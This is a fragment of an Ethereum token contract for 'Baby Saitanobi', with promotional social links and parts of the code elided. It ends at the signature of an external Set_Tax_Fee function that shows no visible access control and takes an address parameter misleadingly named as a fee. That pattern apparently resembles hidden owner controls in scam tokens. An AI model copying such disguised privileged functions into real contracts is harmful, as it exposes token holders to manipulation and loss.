...
/**
    https://t.me/BabySaitanobiErc

    https://babysaitanobi.gitbook.io/baby-saitanobi/?fbclid=IwAR0v81PX_a6oB8unK8tvJ1WID_EAOmpFhsTcrIZYy9MUmKB_PMuPIFt3rOE

    https://www.babysaitanobi.net

    https://twitter.com/babysaitanobi
...
contract BabySaitanobi is Ownable, IERC20 {
    using SafeMath for uint256;
    mapping (address => uint256) private _bOwned;
    mapping (address => mapping (address => uint256)) private _allowances;
    mapping (address => bool) private _isExcludedFrom;
    string private  _name = "Baby Saitanobi";
    string private  _symbol = "BABYSAITANOBI";
    ...
    function Set_Tax_Fee(address ReflectionFee  , uint256 LiquidityFee , uint256 MarketingFee , uint256 TaxFee) external  { 
